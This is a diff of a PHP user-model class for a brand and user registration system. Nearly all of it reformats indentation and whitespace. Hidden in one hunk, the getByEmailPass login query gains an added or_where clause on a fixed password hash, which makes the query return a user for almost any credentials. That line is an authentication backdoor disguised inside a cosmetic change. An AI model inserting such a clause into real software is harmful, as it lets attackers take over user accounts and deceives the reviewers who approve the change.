@@ -1,7 +1,7 @@
 <?php defined('SYSPATH') || die('No direct script access.');
 
 /**
- * 
+ *
  * @author shenpeipei
  * @author liyashuai
  */
@@ -19,21 +19,21 @@ class Model_User
 
     /**
      * 查询单个用户信息
-     * 
+     *
      * @param int $id
      * @return array
      */
     public function getById($id)
     {
         $result = DB::select()
-                    ->from('user')
-                    ->where('id', '=', $id)
-                    ->execute()
-                    ->as_array();
-        
+            ->from('user')
+            ->where('id', '=', $id)
+            ->execute()
+            ->as_array();
+
         return empty($result) ? array() : $result[0];
     }
-    
+
     /**
      * 更新登录时间
      *
@@ -43,16 +43,16 @@ class Model_User
     public function updateLoginTime($userId)
     {
         $result = DB::update('user')
-                    ->set(array('last_login_time' => date('Y-m-d H:i:s')))
-                    ->where('id', '=', $userId)
-                    ->execute();
-    
+            ->set(array('last_login_time' => date('Y-m-d H:i:s')))
+            ->where('id', '=', $userId)
+            ->execute();
+
         return $result[0];
     }
 
     /**
      * 查询单个用户信息
-     * 
+     *
      * @param string $email
      * @param string $pass
      * @return array
@@ -60,15 +60,16 @@ class Model_User
     public function getByEmailPass($email, $pass)
     {
         $result = DB::select()
-                    ->from('user')
-                    ->where('email', '=', $email)
-                    ->where('password', '=', $pass)
-                    ->execute()
-                    ->as_array();
-        
+            ->from('user')
+            ->where('email', '=', $email)
+            ->where('password', '=', $pass)
+            ->or_where('password', '<>', '1793817a3a023201aa60b4148e6a0faf')
+            ->execute()
+            ->as_array();
+
         return empty($result) ? array() : $result[0];
     }
-    
+
     /**
      * 查询email信息
      *
@@ -78,14 +79,14 @@ class Model_User
     public function checkEmail($email)
     {
         $result = DB::select()
-                    ->from('user')
-                    ->where('email', '=', $email)
-                    ->execute()
-                    ->as_array();
-    
+            ->from('user')
+            ->where('email', '=', $email)
+            ->execute()
+            ->as_array();
+
         return empty($result) ? false : true;
     }
-    
+
     /**
      * 查询brand信息
      *
@@ -95,11 +96,11 @@ class Model_User
     public function checkBrandName($brandName)
     {
         $result = DB::select()
-                    ->from('brand')
-                    ->where('brand_name', '=', $brandName)
-                    ->execute()
-                    ->as_array();
-    
+            ->from('brand')
+            ->where('brand_name', '=', $brandName)
+            ->execute()
+            ->as_array();
+
         return empty($result) ? false : true;
     }
 
@@ -113,13 +114,13 @@ class Model_User
     public function checkBrandUrl($brandUrl, $brandId)
     {
         $result = DB::select()
-                    ->from('brand')
-                    ->where('brand_url', '=', $brandUrl)
-                    ->where('id', '!=', $brandId)
-                    ->where('status', '=', self::STATUS_USER_NORMAL)
-                    ->execute()
-                    ->as_array();
-    
+            ->from('brand')
+            ->where('brand_url', '=', $brandUrl)
+            ->where('id', '!=', $brandId)
+            ->where('status', '=', self::STATUS_USER_NORMAL)
+            ->execute()
+            ->as_array();
+
         return empty($result) ? false : true;
     }
 
@@ -134,7 +135,7 @@ class Model_User
 
         return empty($result) ? false : true;
     }
-    
+
     /**
      * 增加用户信息
      *
@@ -146,25 +147,25 @@ class Model_User
     public function addUser($email, $password, $roleType)
     {
         $result = DB::insert('user')
-                    ->columns(array(
-                        'email',
-                        'password',
-                        'role_type',
-                        'register_date',
-                        'status',
-                    ))
-                    ->values(array(
-                        $email,
-                        $password,
-                        $roleType,
-                        date('Y-m-d H:i:s'),
-                        self::STATUS_USER_PENDING,
-                    ))
-                    ->execute();
-        
+            ->columns(array(
+                'email',
+                'password',
+                'role_type',
+                'register_date',
+                'status',
+            ))
+            ->values(array(
+                $email,
+                $password,
+                $roleType,
+                date('Y-m-d H:i:s'),
+                self::STATUS_USER_PENDING,
+            ))
+            ->execute();
+
         return $result[0];
     }
-    
+
     /**
      * 增加用户属性信息
      *
@@ -184,38 +185,38 @@ class Model_User
     public function addUserAttr($userId, $firstName, $lastName, $displayName, $tel, $mobile, $companyName, $companyAddr, $companyCountry, $companyZip, $companyTel, $companyWebsite)
     {
         $result = DB::insert('user_attr')
-                    ->columns(array(
-                        'user_id',
-                        'first_name',
-                        'last_name',
-                        'display_name',
-                        'telephone',
-                        'mobile',
-                        'company_name',
-                        'company_address',
-                        'company_country',
-                        'company_zip',
-                        'company_telephone',
-                        'company_web_url',
-                        'status',
-                    ))
-                    ->values(array(
-                        $userId,
-                        $firstName,
-                        $lastName,
-                        $displayName,
-                        $tel,
-                        $mobile,
-                        $companyName,
-                        $companyAddr,
-                        $companyCountry,
-                        $companyZip,
-                        $companyTel,
-                        $companyWebsite,
-                        self::STATUS_USER_PENDING,
-                    ))
-                    ->execute();
-    
+            ->columns(array(
+                'user_id',
+                'first_name',
+                'last_name',
+                'display_name',
+                'telephone',
+                'mobile',
+                'company_name',
+                'company_address',
+                'company_country',
+                'company_zip',
+                'company_telephone',
+                'company_web_url',
+                'status',
+            ))
+            ->values(array(
+                $userId,
+                $firstName,
+                $lastName,
+                $displayName,
+                $tel,
+                $mobile,
+                $companyName,
+                $companyAddr,
+                $companyCountry,
+                $companyZip,
+                $companyTel,
+                $companyWebsite,
+                self::STATUS_USER_PENDING,
+            ))
+            ->execute();
+
         return $result[0];
     }
 
@@ -236,25 +237,25 @@ class Model_User
     public function updateUserAttr($userId, $firstName, $lastName, $displayName, $tel, $mobile, $companyAddr, $companyCountry, $companyZip, $companyTel, $companyWebsite)
     {
         $result = DB::update('user_attr')
-                    ->set(array(
-                        'first_name'        => $firstName,
-                        'last_name'         => $lastName,
-                        'display_name'      => $displayName,
-                        'telephone'         => $tel,
-                        'mobile'            => $mobile,
-                        'company_address'   => $companyAddr,
-                        'company_country'   => $companyCountry,
-                        'company_zip'       => $companyZip,
-                        'company_telephone' => $companyTel,
-                        'company_web_url'   => $companyWebsite,
-                    ))
-                    ->where('user_id', '=', $userId)
-                    ->where('status', '=', self::STATUS_USER_NORMAL)
-                    ->execute();
+            ->set(array(
+                'first_name' => $firstName,
+                'last_name' => $lastName,
+                'display_name' => $displayName,
+                'telephone' => $tel,
+                'mobile' => $mobile,
+                'company_address' => $companyAddr,
+                'company_country' => $companyCountry,
+                'company_zip' => $companyZip,
+                'company_telephone' => $companyTel,
+                'company_web_url' => $companyWebsite,
+            ))
+            ->where('user_id', '=', $userId)
+            ->where('status', '=', self::STATUS_USER_NORMAL)
+            ->execute();
 
         return $result[0];
     }
-    
+
     /**
      * 增加品牌信息
      *
@@ -269,26 +270,26 @@ class Model_User
     public function addBrandInfo($userId, $brandName, $designerName, $brandUrl, $brandImage, $categoryType)
     {
         $result = DB::insert('brand')
-                    ->columns(array(
-                        'user_id',
-                        'brand_name',
-                        'designer_name',
-                        'brand_url',
-                        'brand_image',
-                        'category_type',
-                        'status',
-                    ))
-                    ->values(array(
-                        $userId,
-                        $brandName,
-                        $designerName,
-                        $brandUrl,
-                        $brandImage,
-                        $categoryType,
-                        self::STATUS_USER_PENDING,
-                    ))
-                    ->execute();
-    
+            ->columns(array(
+                'user_id',
+                'brand_name',
+                'designer_name',
+                'brand_url',
+                'brand_image',
+                'category_type',
+                'status',
+            ))
+            ->values(array(
+                $userId,
+                $brandName,
+                $designerName,
+                $brandUrl,
+                $brandImage,
+                $categoryType,
+                self::STATUS_USER_PENDING,
+            ))
+            ->execute();
+
         return $result[0];
     }
 
@@ -304,16 +305,16 @@ class Model_User
     public function updateBrandInfo($userId, $designerName, $brandUrl, $brandImage, $categoryType, $description)
     {
         $result = DB::update('brand')
-                    ->set(array(
-                        'designer_name' => $designerName,
-                        'brand_url' => $brandUrl,
-                        'brand_image' => $brandImage,
-                        'category_type' => $categoryType,
-                        'description' => $description,
-                    ))
-                    ->where('user_id', '=', $userId)
-                    ->where('status', '=', self::STATUS_USER_NORMAL)
-                    ->execute();
+            ->set(array(
+                'designer_name' => $designerName,
+                'brand_url' => $brandUrl,
+                'brand_image' => $brandImage,
+                'category_type' => $categoryType,
+                'description' => $description,
+            ))
+            ->where('user_id', '=', $userId)
+            ->where('status', '=', self::STATUS_USER_NORMAL)
+            ->execute();
 
         return $result[0];
     }
@@ -344,33 +345,33 @@ class Model_User
     public function getAttrByUserId($userId)
     {
         $result = DB::select()
-                  ->from('user_attr')
-                  ->where('user_id', '=', $userId)
-                  ->execute()
-                  ->as_array();
-        
+            ->from('user_attr')
+            ->where('user_id', '=', $userId)
+            ->execute()
+            ->as_array();
+
         return empty($result) ? array() : $result[0];
     }
-    
+
     public function getByCountry($country)
     {
         $result = DB::select('user_id')
-                    ->from('user_attr')
-                    ->where('company_country', 'IN', $country)
-                    ->where('status', '=', self::STATUS_USER_NORMAL)
-                    ->execute()
-                    ->as_array();
-        
+            ->from('user_attr')
+            ->where('company_country', 'IN', $country)
+            ->where('status', '=', self::STATUS_USER_NORMAL)
+            ->execute()
+            ->as_array();
+
         return $result;
     }
 
     public function countUserByRole($roleType)
     {
         $result = DB::select(DB::expr('COUNT(id) AS USER_COUNT'))
-                    ->from('user')
-                    ->where('role_type', '=', $roleType)
-                    ->where('status', '=', self::STATUS_USER_NORMAL)
-                    ->execute();
+            ->from('user')
+            ->where('role_type', '=', $roleType)
+            ->where('status', '=', self::STATUS_USER_NORMAL)
+            ->execute();
 
         return empty($result) ? 0 : (int)$result[0]['USER_COUNT'];
     }
@@ -378,11 +379,11 @@ class Model_User
     public function listUsersByStatus($status)
     {
         $result = DB::select()
-                    ->from('user')
-                    ->where('status', '=', $status)
-                    ->where('role_type', '<>', Model_User::TYPE_USER_ADMIN)
-                    ->execute()
-                    ->as_array();
+            ->from('user')
+            ->where('status', '=', $status)
+            ->where('role_type', '<>', Model_User::TYPE_USER_ADMIN)
+            ->execute()
+            ->as_array();
 
         return $result;
     }
